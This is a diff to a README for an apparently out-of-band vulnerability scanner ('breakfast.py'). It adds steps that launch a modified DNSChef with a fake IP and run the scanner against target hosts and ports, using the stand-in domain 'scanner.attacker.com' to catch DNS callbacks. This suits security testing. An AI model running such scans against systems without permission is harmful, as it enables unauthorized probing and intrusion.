@@ -13,11 +13,20 @@ This is the typical DNS configuration expected on your domain registrar. It will
 NS scanner.attacker.com dnschef.attacker.com
 A dnschef.attacker.com 10.11.12.13
 ```
-`10.11.12.13` : The public IP address that is 
-`attacker.com` : A domain name you own
+
+ - `10.11.12.13` : The public IP address that is 
+ - `attacker.com` : A domain name you own
+
+It is highly recommended to use this [modify version of DNS Chef](./dnschef) that decoded the metadata place.
 
 ## Single IP scan
 
+Launch DNSChef
+```
+python dnschef.py -q --fakeip 127.0.0.1 -i 0.0.0.0
+```
+
+Launch the scanner
 ```
 python breakfast.py -t 192.168.40.1 -p 7001 -d scanner.attacker.com
 ```
@@ -35,6 +44,12 @@ $ cat list_servers.txt
 192.168.40.102:8001
 ```
 
+Launch DNSChef
+```
+python dnschef.py -q --fakeip 127.0.0.1 -i 0.0.0.0
+```
+
+Launch the scanner
 ```
 cat list_servers.txt | python breakfast.py -stdin -d scanner.attacker.com
 ```
